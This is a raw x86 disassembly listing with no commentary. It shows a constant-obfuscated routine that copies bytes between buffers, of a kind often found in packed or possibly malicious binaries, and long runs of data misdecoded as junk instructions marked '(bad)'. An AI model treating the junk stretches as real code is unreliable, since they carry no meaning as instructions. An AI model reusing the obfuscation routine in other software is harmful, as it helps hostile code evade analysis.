  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi+0x287e1b8c]
  415305:	mov    esp,0xebcbcd9
  41530a:	push   ss
  41530b:	sbb    BYTE PTR [ebp-0x7ee7e7ee],dh
  415311:	iret   
  415312:	adc    ecx,esp
  415314:	ja     0x4152f2
  415316:	(bad)  
  415317:	adc    BYTE PTR [edi+0x48],cl
  41531a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41531b:	popf   
  41531c:	adc    al,0x24
  41531e:	push   es
  41531f:	adc    ch,BYTE PTR [ebx]
  415321:	aas    
  415322:	in     al,dx
  415323:	sub    ch,al
  415325:	and    DWORD PTR ds:0x6fd88b27,0x60
  41532c:	lods   al,BYTE PTR ds:[esi]
  41532d:	inc    edx
  41532f:	call   0xd38b:0x3fb6a88b
  415336:	in     eax,0x7f
  415338:	push   ebx
  415339:	cdq    
  41533a:	ffree  st(6)
  41533c:	xchg   edi,eax
  41533d:	dec    ebp
  41533e:	lds    ebx,FWORD PTR [eax]
  415340:	xor    al,0x3b
  415343:	or     eax,0x301e8d68
  415348:	mov    dh,0x24
  41534a:	mov    cl,0xae
  41534c:	sahf   
  41534d:	pop    esi
  41534e:	rcr    BYTE PTR [eax+0x6f],cl
  415351:	mov    esp,0x2e351ecc
  415356:	adc    cl,0x2e
  415359:	and    BYTE PTR [ecx-0x6c],dl
  41535c:	xor    DWORD PTR [ecx-0x2c1cc28],esp
  415362:	mov    edx,eax
  415364:	sbb    eax,0x5426e4d6
  415369:	sub    al,0x1f
  41536b:	sbb    ah,BYTE PTR [ebx-0x49b7157]
  415371:	rcl    BYTE PTR [ebx-0x5222631],cl
  415377:	sahf   
  415378:	clc    
  415379:	sahf   
  41537a:	out    dx,al
  41537b:	mov    al,0x0
  41537d:	jecxz  0x415329
  41537f:	shl    BYTE PTR [eax+edi*4+0x1645b629],cl
  415386:	cmp    bh,BYTE PTR [esi+0x27]
  415389:	shl    dh,cl
  41538b:	jecxz  0x4153d9
  41538d:	push   cs
  41538e:	test   eax,0x125364f2
  415393:	or     eax,0x505f6f07
  415398:	jno    0x415363
  41539a:	fwait
  41539b:	nop
  41539c:	adc    al,0xc
  41539e:	cwde   
  41539f:	adc    DWORD PTR [esi-0x3],ecx
  4153a2:	call   0x90a2:0x4596d2a3
  4153a9:	lods   al,BYTE PTR fs:[esi]
  4153ab:	inc    eax
  4153ac:	aaa    
  4153ad:	cmp    dl,ch
  4153af:	mov    edi,0x9c3ffc92
  4153b4:	or     al,0xd8
  4153b6:	inc    esi
  4153b7:	ret    0x4827
  4153ba:	inc    eax
  4153bb:	xchg   ebp,eax
  4153bc:	in     eax,dx
  4153bd:	vunpckhps xmm4,xmm5,XMMWORD PTR [edi-0x26e8c80b]
  4153c5:	fs jmp 0x2d01:0x860cba30
  4153cd:	sbb    BYTE PTR [ecx+0x5bf4cdbf],ch
  4153d3:	pushf  
  4153d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153d5:	inc    eax
  4153d6:	stos   DWORD PTR es:[edi],eax
  4153d7:	adc    edx,eax
  4153d9:	mov    ebp,0xa433f2b0
  4153de:	add    al,0xdf
  4153e0:	jl     0x4153fb
  4153e2:	jecxz  0x4153f8
  4153e4:	aas    
  4153e5:	loopne 0x4153e5
  4153e7:	mov    ch,0x9d
  4153e9:	inc    ecx
  4153ea:	popa   
  4153eb:	cli    
  4153ec:	adc    ecx,DWORD PTR [edx+ebx*2]
  4153ef:	mov    bl,BYTE PTR [esi]
  4153f1:	pop    es
  4153f2:	inc    esi
  4153f3:	test   DWORD PTR [ecx+ebx*2],0xc3c867c2
  4153fa:	sbb    ah,BYTE PTR [ecx-0x20]
  4153fd:	mov    ecx,0xa1cab897
  415402:	sub    al,0x8b
  415404:	mov    ds:0x4c777f69,eax
  415409:	pop    esi
  41540a:	sbb    DWORD PTR [esi-0x5821f9c8],esi
  415410:	add    ah,BYTE PTR [eax]
  415412:	sbb    al,0xec
  415414:	cs scas eax,DWORD PTR es:[edi]
  415416:	leave  
  415417:	call   0xf653fde5
  41541c:	cwde   
  41541d:	addr16 or DWORD PTR [di],esp
  415421:	or     esi,DWORD PTR [esi]
  415423:	push   ecx
  415424:	add    cl,bh
  415426:	bound  ebp,QWORD PTR [ebx+0x67466d33]
  41542c:	into   
  41542d:	add    BYTE PTR [esi],cl
  41542f:	rcl    BYTE PTR [eax+ebx*4],1
  415432:	dec    ebp
  415433:	sub    dl,bh
  415435:	xchg   BYTE PTR [eax+eax*4+0x1de090c7],al
  41543c:	stos   DWORD PTR es:[edi],eax
  41543d:	mov    DWORD PTR [esi+0x4c577be6],ebx
  415443:	xor    BYTE PTR [edi],bh
  415445:	pop    eax
  415446:	fild   DWORD PTR ds:0x8dcc1b52
  41544c:	and    al,0xa7
  41544e:	je     0x415479
  415450:	(bad)  
  415451:	adc    dl,BYTE PTR [esi+0x3f]
  415454:	mov    ch,0x55
  415457:	pop    es
  415458:	xchg   DWORD PTR [ebx+0x31],ebx
  41545b:	pop    edi
  41545c:	jge    0x4154a4
  41545e:	add    DWORD PTR [edx],ecx
  415460:	cmc    
  415461:	rcl    BYTE PTR [eax],cl
  415463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415464:	shr    ch,cl
  415466:	cmp    al,0x34
  415468:	es inc edx
  41546a:	mov    bl,0x6b
  41546c:	fldenv [ebx-0x61]
  41546f:	pop    eax
  415470:	ins    BYTE PTR es:[edi],dx
  415471:	mov    eax,0x7fdfbc09
  415476:	(bad)  
  415477:	jg     0x415450
  415479:	mov    BYTE PTR [edi+eax*8],0xaa
  41547d:	test   BYTE PTR [edx+0x4525b9df],0x3
  415484:	mov    ah,0xb3
  415486:	mov    ah,ch
  415488:	out    0x8b,eax
  41548a:	cdq    
  41548b:	test   BYTE PTR [ebx-0x6e600c8],ah
  415491:	in     al,0xde
  415493:	(bad)  
  415494:	mov    esi,0xbc8585a3
  415499:	fdiv   st(0),st
  41549b:	add    dh,bl
  41549d:	aas    
  41549e:	out    0x2a,al
  4154a0:	jmp    0xbfd6:0xe712fe0f
  4154a7:	repz (bad) 
  4154a9:	shr    cl,cl
  4154ab:	in     eax,0x24
  4154ad:	push   edi
  4154ae:	pusha  
  4154af:	adc    edi,DWORD PTR ds:0xb2b10d13
  4154b5:	call   0x2f16:0x69863040
  4154bc:	add    DWORD PTR [ecx+edx*4+0x7],esi
  4154c0:	stos   DWORD PTR es:[edi],eax
  4154c1:	bound  edx,QWORD PTR [ecx]
  4154c3:	fs inc ebp
  4154c5:	(bad)  
  4154c6:	out    dx,al
  4154c7:	or     DWORD PTR [ebx],ebp
  4154c9:	pop    esi
  4154ca:	and    ebx,DWORD PTR [ebp-0x4bcc42af]
  4154d0:	push   edi
  4154d1:	nop
  4154d2:	xchg   DWORD PTR [eax],ebp
  4154d4:	(bad)  
  4154d5:	popf   
  4154d6:	ja     0x415510
  4154d8:	mov    edx,esi
  4154da:	test   DWORD PTR [edi],0x6dbd6b84
  4154e0:	lahf   
  4154e1:	or     eax,0xed154b71
  4154e6:	ja     0x415507
  4154e8:	arpl   WORD PTR [eax-0x3c],ax
  4154eb:	pop    edx
  4154ec:	xor    BYTE PTR [esi+0x56aa7b25],ch
  4154f2:	pop    ds
  4154f3:	(bad)  
  4154f4:	push   ecx
  4154f5:	push   edi
  4154f6:	jecxz  0x4154fd
  4154f8:	iret   
  4154f9:	and    ebp,edx
  4154fb:	mov    ecx,0xef7c1a87
  415500:	cmp    ebx,DWORD PTR [esi+edx*2]
  415503:	into   
  415504:	pop    ebx
  415505:	pop    ebx
  415506:	cmp    ecx,ebx
  415508:	mov    BYTE PTR [ebx+0x6f],al
  41550b:	xor    esi,DWORD PTR [ecx+0x51c50ebb]
  415511:	out    dx,eax
  415512:	inc    ebx
  415513:	sahf   
  415514:	push   ecx
  415515:	push   edi
  415516:	mov    ds:0xc7845910,eax
  41551b:	sub    BYTE PTR [ebp+0x4c0a9224],ah
  415521:	fisttp WORD PTR [ecx]
  415523:	(bad)  
  415524:	inc    cl
  415526:	test   ebx,esi
  415528:	jnp    0x41556e
  41552a:	(bad)  
  41552b:	fbld   TBYTE PTR [ecx]
  41552d:	in     eax,0x6d
  41552f:	push   ecx
  415530:	popa   
  415531:	pshufw mm5,QWORD PTR [edi],0x86
  415535:	add    eax,0xf41e7f1b
  41553a:	(bad)  
  41553b:	popa   
  41553c:	fnstsw WORD PTR [ebp+edi*4+0x78]
  415540:	fstp   QWORD PTR [ecx]
  415542:	fimul  DWORD PTR [ebp-0x75]
  415545:	loopne 0x415523
  415547:	int    0x15
  415549:	push   es
  41554a:	gs jle 0x41556a
  41554d:	jg     0x4155a9
  41554f:	adc    BYTE PTR [edx-0x53],ah
  415552:	imul   ebp,DWORD PTR [ecx-0x21],0x4f
  415556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415557:	in     eax,0x11
  415559:	dec    edx
  41555a:	fldenv [esi-0x6810eb0c]
  415560:	test   eax,0x523dcfda
  415565:	sub    BYTE PTR [edi-0x2d],dl
  415568:	xchg   ebx,eax
  415569:	mov    dl,0x38
  41556b:	sub    BYTE PTR [ecx+0x5f63282b],0xb6
  415572:	div    DWORD PTR es:0x9bc5131a
  415579:	xchg   ecx,eax
  41557a:	adc    bl,cl
  41557c:	xchg   edi,eax
  41557d:	out    0xbd,al
  41557f:	lock pop ds
  415581:	mov    ah,0x8f
  415583:	xchg   ebp,eax
  415584:	aas    
  415585:	mov    cl,0x9d
  415587:	xor    eax,0xafc5c146
  41558c:	mov    dl,0x2e
  41558e:	mov    dl,0x86
  415590:	nop
  415591:	push   esi
  415592:	(bad)  
  415593:	(bad)  
  415594:	sti    
  415595:	inc    eax
  415596:	jp     0x4155ea
  415598:	jo     0x415524
  41559a:	xor    al,ah
  41559c:	hlt    
  41559d:	mov    BYTE PTR [ecx+ebp*4+0x10],ch
  4155a1:	mov    dl,dl
  4155a3:	into   
  4155a4:	push   esi
  4155a5:	mov    dh,0x58
  4155a7:	dec    ebx
  4155a8:	cmp    bl,BYTE PTR [eax+edi*8-0x2]
  4155ac:	pop    edx
  4155ad:	fadd   st,st(0)
  4155af:	(bad)  
  4155b0:	mov    cl,0x62
  4155b2:	jle    0x415616
  4155b4:	xor    al,BYTE PTR [edx-0x656d31ea]
  4155ba:	js     0x4155d5
  4155bc:	xor    edi,ecx
  4155be:	xchg   esp,eax
  4155bf:	add    eax,0x23210f51
  4155c4:	adc    eax,DWORD PTR [edi+0x40]
  4155c7:	or     eax,0xd215decf
  4155cc:	cmp    bl,BYTE PTR [edi-0x76]
  4155cf:	push   ds
  4155d0:	jg     0x41564e
  4155d2:	aas    
  4155d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155d4:	mov    dl,0x4
  4155d6:	xchg   cl,al
  4155d8:	hlt    
  4155d9:	and    BYTE PTR [esi+0x28],cl
  4155dc:	retf   0xe6a1
  4155df:	shl    BYTE PTR [eax+0x36112681],0x71
  4155e6:	xchg   esp,eax
  4155e7:	sub    bl,BYTE PTR [ebp+0x4fbffbb3]
  4155ed:	sbb    DWORD PTR [edx-0xeac4582],ebp
  4155f3:	hlt    
  4155f4:	mov    ecx,0xf46e177a
  4155f9:	push   cs
  4155fa:	xchg   ebx,eax
  4155fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155fc:	jmp    0xe864:0xf239eb84
  415603:	add    esp,ecx
  415605:	dec    eax
  415606:	mov    dh,0x46
  415608:	mov    bl,0x7
  41560a:	sub    DWORD PTR [esi],edx
  41560c:	sub    DWORD PTR [ebx+ecx*4+0x4177dcd5],ebp
  415613:	ins    BYTE PTR es:[edi],dx
  415614:	mov    ah,0xc6
  415616:	mov    ah,0xf0
  415618:	es aas 
  41561a:	jg     0x4155d4
  41561c:	cwde   
  41561d:	jge    0x41567e
  41561f:	rcl    BYTE PTR [eax+esi*2-0x3b7e013b],0x98
  415627:	(bad)  
  415628:	loop   0x415678
  41562a:	or     BYTE PTR [ecx-0x50c00c25],dh
  415630:	(bad)  
  415631:	adc    ch,dh
  415633:	mov    DWORD PTR [ebx+0x75395cf3],esi
  415639:	add    esp,ecx
  41563b:	iret   
  41563c:	loop   0x415651
  41563e:	pop    ecx
  41563f:	jno    0x41564b
  415641:	pop    esi
  415642:	sbb    DWORD PTR [ecx-0x5f],ecx
  415645:	adc    al,0x8b
  415647:	inc    ebp
  415648:	lock mov edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x4156eb
  41567f:	xor    ebx,DWORD PTR ds:0x1608587e
  415685:	sbb    BYTE PTR [ebp+0x2e181812],dh
  41568b:	ja     0x4156a7
  41568d:	mul    DWORD PTR [edi]
  41568f:	xor    esi,edx
  415691:	inc    ecx
  415692:	repnz pop edi
  415694:	les    edx,FWORD PTR [edx-0x7559dca0]
  41569a:	repz or BYTE PTR [edi-0x6840f5fb],0xe2
  4156a2:	xchg   esi,eax
  4156a3:	repnz mov ecx,0x77eb37f1
  4156a9:	aas    
  4156aa:	mov    al,0xa4
  4156ac:	fwait
  4156ad:	jae    0x415643
  4156af:	adc    eax,0x7c18e13b
  4156b4:	or     eax,0x9203273d
  4156b9:	push   0x2a
  4156bb:	push   0x63ba4e42
  4156c0:	inc    ebp
  4156c1:	add    al,BYTE PTR [esi+0x142fd8aa]
  4156c7:	mov    bh,BYTE PTR [edi-0x1c]
  4156ca:	lods   eax,DWORD PTR ds:[esi]
  4156cb:	or     al,0x3b
  4156cd:	mov    WORD PTR [bx+di],?
  4156d0:	sub    al,0x6c
  4156d2:	push   esi
  4156d3:	and    BYTE PTR [ecx-0x4800eda2],ah
  4156d9:	push   esp
  4156da:	ror    BYTE PTR [edx-0x2d],0xd
  4156de:	inc    ebx
  4156df:	mov    eax,ds:0x41410b2a
  4156e4:	sub    eax,0xa74bdf23
  4156e9:	jl     0x41573d
  4156eb:	and    bl,bl
  4156ed:	xchg   ecx,edx
  4156ef:	lds    ecx,FWORD PTR [edx]
  4156f1:	fs pop esi
  4156f3:	mov    dl,0x36
  4156f5:	gs ins BYTE PTR es:[edi],dx
  4156f7:	daa    
  4156f8:	dec    eax
  4156f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156fa:	and    ah,BYTE PTR [ebx+0x25]
  4156fd:	cs in  eax,0x2b
  415700:	data16 out dx,al
  415702:	push   ecx
  415703:	push   edi
  415704:	popf   
  415705:	or     DWORD PTR [esp+eax*8],esi
  415708:	test   BYTE PTR [eax+ecx*8+0x24],0x69
  41570d:	jne    0x4156bd
  41570f:	mov    ebp,DWORD PTR [edx-0x5a]
  415712:	mov    BYTE PTR ds:0xd1e7183e,dl
  415718:	xchg   ecx,eax
  415719:	dec    esi
  41571a:	pop    ecx
  41571b:	cmp    esp,edx
  41571d:	out    0xb9,eax
  41571f:	outs   dx,BYTE PTR ds:[esi]
  415720:	mov    fs,ecx
  415722:	in     al,dx
  415723:	cdq    
  415724:	lea    esp,[esi]
  415726:	in     al,0xb4
  415728:	(bad)  
  415729:	repz xchg esi,eax
  41572b:	addr16 cmp ebx,edi
  41572e:	test   bl,dh
  415730:	jbe    0x4156e6
  415732:	pop    ds
  415733:	es std 
  415735:	sub    bh,ch
  415737:	sar    BYTE PTR [edx+0x19],cl
  41573a:	mov    ?,WORD PTR [edi-0x654e790]
  415740:	push   es
  415741:	add    bl,BYTE PTR [edx-0x59208b4f]
  415747:	xchg   edi,eax
  415748:	loopne 0x41570e
  41574a:	inc    eax
  41574b:	ins    BYTE PTR es:[edi],dx
  41574c:	sub    ebx,edi
  41574e:	adc    al,0x29
  415750:	retf   0x399b
  415753:	push   eax
  415754:	shl    esi,1
  415756:	fmul   st(6),st
  415758:	cmp    edx,DWORD PTR [edx-0x56]
  41575b:	outs   dx,DWORD PTR ds:[esi]
  41575c:	pop    esi
  41575d:	push   cs
  41575e:	stos   BYTE PTR es:[edi],al
  41575f:	(bad)  
  415760:	ret    0x3bff
  415763:	push   ebx
  415764:	jle    0x4156ef
  415766:	lods   eax,DWORD PTR ds:[esi]
  415767:	push   ecx
  415768:	scas   al,BYTE PTR es:[di]
  41576a:	mov    dl,0x2d
  41576c:	mov    al,ds:0x103e0ed0
  415771:	(bad)  
  415772:	loopne 0x4157da
  415774:	push   ecx
  415775:	xor    ecx,esi
  415777:	jns    0x415709
  415779:	add    BYTE PTR [edi],0x39
  41577c:	dec    ecx
  41577d:	cli    
  41577e:	push   ecx
  41577f:	pop    ss
  415780:	int3   
  415781:	(bad)  
  415782:	jnp    0x4157f8
  415784:	inc    esp
  415785:	sbb    DWORD PTR [edx],esi
  415787:	dec    esp
  415788:	daa    
  415789:	in     al,dx
  41578a:	hlt    
  41578b:	test   al,0x39
  41578d:	sbb    bh,0x9d
  415790:	add    edx,DWORD PTR ds:0xe5e952f3
  415796:	stc    
  415797:	mov    ds:0xfb032d49,eax
  41579c:	(bad)  
  41579d:	mov    ah,0x82
  41579f:	pop    ss
  4157a0:	mov    ?,ecx
  4157a2:	jno    0x41581f
  4157a4:	sahf   
  4157a5:	xor    BYTE PTR [edx+0x1e],cl
  4157a8:	xchg   eax,esp
  4157aa:	test   bl,cl
  4157ac:	jmp    0x8cb7:0xacaf9846
  4157b3:	into   
  4157b4:	lahf   
  4157b5:	cld    
  4157b6:	xor    bh,ah
  4157b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157b9:	dec    eax
  4157ba:	push   ss
  4157bb:	xor    BYTE PTR [ecx],al
  4157bd:	mov    al,ds:0x8720b71
  4157c2:	or     eax,0xea473c2
  4157c7:	jmp    0x468d:0x583ebba2
  4157ce:	jl     0x4157c1
  4157d0:	arpl   bp,dx
  4157d2:	sub    ecx,ebp
  4157d4:	pop    edi
  4157d5:	xor    BYTE PTR [ebx+0x673e7f5d],ah
  4157db:	mov    DWORD PTR [edx+0x4b],edi
  4157de:	mov    es,WORD PTR [eax]
  4157e0:	test   edi,esi
  4157e2:	cmp    BYTE PTR [eax-0x42892ada],0xd3
  4157e9:	test   eax,0x825486ef
  4157ee:	dec    esi
  4157ef:	cs push ecx
  4157f1:	les    eax,FWORD PTR [edx]
  4157f3:	fcomp  QWORD PTR [edx+0x7e8b606d]
  4157f9:	repnz pop ecx
  4157fb:	and    eax,0xa3929832
  415800:	fnstenv [ebx+0x31]
  415803:	rcr    DWORD PTR [eax+0x3d],1
  415806:	mov    ds:0xb25f6a3d,eax
  41580b:	mov    ds:0x60f41f02,eax
  415810:	stc    
  415811:	aaa    
  415812:	mov    edx,0xbe085d96
  415817:	jnp    0x4157df
  415819:	inc    DWORD PTR [edi-0x73ce30f]
  41581f:	in     eax,0xfb
  415821:	fisub  DWORD PTR [ebx-0x656a9b29]
  415827:	or     al,0x9a
  415829:	imul   ebx,DWORD PTR [eax],0xea7b22f
  41582f:	xor    BYTE PTR [edi+edx*1+0x26986073],0x33
  415837:	jecxz  0x415836
  415839:	mov    cl,0x11
  41583b:	sbb    DWORD PTR [edi+0x42c76f99],edi
  415841:	add    al,BYTE PTR [esi+0x52]
  415844:	fld    DWORD PTR [ebx+0x73]
  415847:	xchg   esp,eax
  415848:	sub    eax,0x70ea4b3
  41584d:	aam    0x59
  41584f:	js     0x4158ce
  415851:	scas   eax,DWORD PTR es:[edi]
  415852:	(bad)
  415855:	xchg   esp,eax
  415856:	mov    ds,WORD PTR [ebp+edx*2+0x116aab65]
  41585d:	pusha  
  41585e:	sbb    al,0x1d
  415860:	adc    BYTE PTR [edx+0x7e],0x4
  415864:	sub    ah,BYTE PTR [edx]
  415866:	loope  0x4157f8
  415868:	stc    
  415869:	std    
  41586a:	xor    BYTE PTR [eax-0x38f86d0d],al
  415870:	dec    edi
  415871:	in     al,0x5c
  415873:	xchg   esi,eax
  415874:	push   ss
  415875:	cmp    eax,esp
  415877:	lahf   
  415878:	frstor [edx-0x206bec02]
  41587e:	mov    al,ds:0x2007e2f6
  415883:	jle    0x415847
  415885:	add    BYTE PTR [ebx+0x70b98f6],ch
  41588b:	pop    esi
  41588c:	out    0x6d,al
  41588e:	leave  
  41588f:	xchg   edx,eax
  415890:	pop    edi
  415891:	adc    al,al
  415893:	ret    0xdbaf
  415896:	mov    cl,0x91
  415898:	pop    eax
  415899:	pop    esp
  41589a:	push   edi
  41589b:	cmp    BYTE PTR [esi+0x71],cl
  41589e:	inc    edi
  41589f:	repnz call 0x4b7a:0xb91842ae
  4158a7:	into   
  4158a8:	ret    0x4653
  4158ab:	mov    edx,0xe3aab67b
  4158b0:	jg     0x4158b4
  4158b2:	cmp    DWORD PTR [ebx+0x30],0x326357d3
  4158b9:	daa    
  4158ba:	ds mov ebp,0x3139b9b
  4158c0:	addr16 js 0x415851
  4158c3:	and    dh,BYTE PTR [edx-0x3a7f54c4]
  4158c9:	xchg   ebp,eax
  4158ca:	stos   BYTE PTR es:[edi],al
  4158cb:	mov    bl,bh
  4158cd:	daa    
  4158ce:	and    DWORD PTR [edx+0x38d9c2c6],ebx
  4158d4:	hlt    
  4158d5:	scas   eax,DWORD PTR es:[edi]
  4158d6:	stos   BYTE PTR es:[edi],al
  4158d7:	aaa    
  4158d8:	lahf   
  4158d9:	call   0x585:0x45d209d6
  4158e0:	in     al,dx
  4158e1:	fisub  WORD PTR [ecx+0x1c1303b5]
  4158e7:	(bad)  
  4158e8:	ja     0x4158e9
  4158ea:	scas   al,BYTE PTR es:[edi]
  4158eb:	inc    esi
  4158ec:	dec    esp
  4158ed:	sar    BYTE PTR [esi],1
  4158ef:	hlt    
  4158f0:	adc    BYTE PTR [esi+0x4d],dh
  4158f3:	inc    ecx
  4158f4:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4158f6:	out    0x69,eax
  4158f8:	push   cs
  4158f9:	mov    ah,0xc7
  4158fb:	fstp   st(4)
  4158fd:	xchg   BYTE PTR [ebx-0x16688774],dh
  415903:	loopne 0x4158aa
  415905:	stos   DWORD PTR es:[edi],eax
  415906:	or     al,0x61
  415908:	ins    DWORD PTR es:[edi],dx
  415909:	imul   eax,DWORD PTR [ebp+ebx*1-0xef88d28],0x72b67253
  415914:	pusha  
  415915:	sbb    BYTE PTR [edi+0x2acff9ad],ah
  41591b:	pop    ds
  41591c:	out    0x72,eax
  41591e:	pop    ecx
  41591f:	mov    esi,edi
  415921:	or     DWORD PTR [esi+0x23],esp
  415924:	test   al,0x22
  415926:	inc    esp
  415927:	ins    DWORD PTR es:[edi],dx
  415928:	add    DWORD PTR [ebx],edi
  41592a:	mov    eax,ds:0x666415fd
  41592f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415930:	mov    edi,0xc00a421a
  415935:	sub    BYTE PTR [edi+ecx*1-0x7935dfe],dl
  41593c:	jne    0x415948
  41593e:	lods   al,BYTE PTR ds:[esi]
  41593f:	inc    edi
  415940:	sub    DWORD PTR [esi-0x531aca7b],esi
  415946:	loope  0x415983
  415948:	push   es
  415949:	xor    BYTE PTR [edx-0x75247fb],0x5e
  415950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415951:	int    0x84
  415953:	loope  0x4159b3
  415955:	mov    BYTE PTR [edx-0x2b],0x1d
  415959:	push   0xfccb3735
  41595e:	push   ebp
  41595f:	xor    DWORD PTR ds:0x9f64d1a2,eax
  415965:	adc    eax,0xb4cf8fc
  41596a:	jno    0x415999
  41596c:	cdq    
  41596d:	iret   
  41596e:	inc    eax
  41596f:	jae    0x41591f
  415971:	xchg   esi,eax
  415972:	data16 (bad) 
  415974:	or     al,0xf9
  415976:	mov    edi,0x9f2fb46a
  41597b:	mov    ebx,0xcac01d33
  415980:	sti    
  415981:	sbb    bh,bh
  415983:	fdivr  QWORD PTR [eax+0x26]
  415986:	int    0x5b
  415988:	pop    ecx
  415989:	fistp  DWORD PTR [ecx-0xfe84b9b]
  41598f:	es das 
  415991:	test   DWORD PTR [ecx],ecx
  415993:	xchg   edi,eax
  415994:	sbb    BYTE PTR ds:0x984c5a20,al
  41599a:	xor    BYTE PTR [edi-0x5d84d1f2],cl
  4159a0:	pop    ecx
  4159a1:	out    0xfa,al
  4159a3:	xchg   dl,bl
  4159a5:	mov    ebp,esp
  4159a7:	jge    0x415991
  4159a9:	xlat   BYTE PTR ds:[ebx]
  4159aa:	mov    al,0x16
  4159ac:	(bad)  
  4159ad:	adc    al,0xe0
  4159af:	dec    ebx
  4159b0:	sbb    bl,cl
  4159b2:	retf   
  4159b3:	push   es
  4159b4:	(bad)  
  4159b5:	dec    esi
  4159b6:	lahf   
  4159b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159b8:	mov    cl,0xc0
  4159ba:	lods   eax,DWORD PTR ds:[esi]
  4159bb:	cmp    dl,BYTE PTR [edx]
  4159bd:	mov    cl,0x96
  4159bf:	jmp    0x34219f4f
  4159c4:	ror    BYTE PTR [ebx-0x2fdc23bb],1
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42826b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x4283a7,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42823b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42819b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282ff
  415a48:	cmp    DWORD PTR ds:0x42823b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ef4
  415a74:	mov    edi,DWORD PTR ds:0x4281cf
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x4281ef
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428187
